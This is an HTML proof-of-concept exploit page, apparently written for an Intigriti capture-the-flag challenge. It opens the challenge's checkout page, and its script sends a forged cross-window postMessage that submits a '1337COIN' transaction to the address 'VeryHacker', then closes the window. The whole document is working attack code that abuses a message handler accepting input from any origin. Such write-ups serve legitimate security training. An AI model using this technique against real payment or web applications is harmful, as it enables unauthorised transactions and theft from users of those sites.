<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC</title>
</head>
<body>
    <script>
        const challengeUrl = 'https://challenge-0126.intigriti.io';
        const currency = '1337COIN'; 
        const yourAddress = "VeryHacker";
        const amount = 3; 

        const checkoutWindow = window.open(challengeUrl + '/checkout.html?currency=' + currency + '&price=1');

        setTimeout(() => {
            checkoutWindow.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: yourAddress, 
                    currency: '1337COIN',
                    amount: 1
                }
            }, '*');
                        setTimeout(() => {
                checkoutWindow.close();
            }, 2000);
        }, 10000); 
    </script>
</body>
</html>
